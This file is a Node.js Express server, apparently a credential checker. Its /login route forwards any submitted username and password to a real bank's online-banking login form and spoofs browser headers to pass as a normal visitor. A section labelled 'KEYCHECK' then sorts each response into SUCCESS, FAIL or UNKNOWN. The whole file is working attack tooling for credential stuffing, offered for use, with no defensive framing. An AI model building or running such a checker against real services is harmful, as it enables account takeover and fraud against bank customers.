import express from "express";
import axios from "axios";
import https from "https";

const app = express();
app.use(express.json());

// ===============================
// Secure HTTPS Agent (High Security)
// ===============================
const secureAgent = new https.Agent({
  keepAlive: true,

  // إجبار TLS قوي فقط
  minVersion: "TLSv1.2",
  maxVersion: "TLSv1.3",

  // Cipher Suites قوية
  ciphers: [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
  ].join(":"),

  honorCipherOrder: true,
  rejectUnauthorized: true
});

// ===============================
// Test Route
// ===============================
app.get("/", (req, res) => {
  res.send("API is running");
});

// ===============================
// Login Route
// ===============================
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  // Validate input
  if (!username || !password) {
    return res.status(400).json({
      success: false,
      error: "Missing username or password"
    });
  }

  try {
    const response = await axios.post(
      "https://digitallobby.huntington.com/pkmslogin.form",
      new URLSearchParams({
        username: username,
        password: password,
        "login-form-type": "pwd"
      }).toString(),
      {
        httpsAgent: secureAgent,
        proxy: false, // مهم لو فيه proxy خارجي

        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Accept": "application/json, text/plain, */*",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          "Origin": "https://digitallobby.huntington.com",
          "Referer": "https://digitallobby.huntington.com/login"
        },

        timeout: 15000
      }
    );

    const body =
      typeof response.data === "string"
        ? response.data
        : JSON.stringify(response.data);

    // ===============================
    // KEYCHECK
    // ===============================
    if (body.includes('"operation" : "login_success"')) {
      return res.json({
        success: true,
        status: "SUCCESS"
      });
    }

    if (body.includes('"operation" : "login"')) {
      return res.json({
        success: false,
        status: "FAIL"
      });
    }

    return res.json({
      success: false,
      status: "UNKNOWN_RESPONSE"
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

// ===============================
// Start Server
// ===============================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
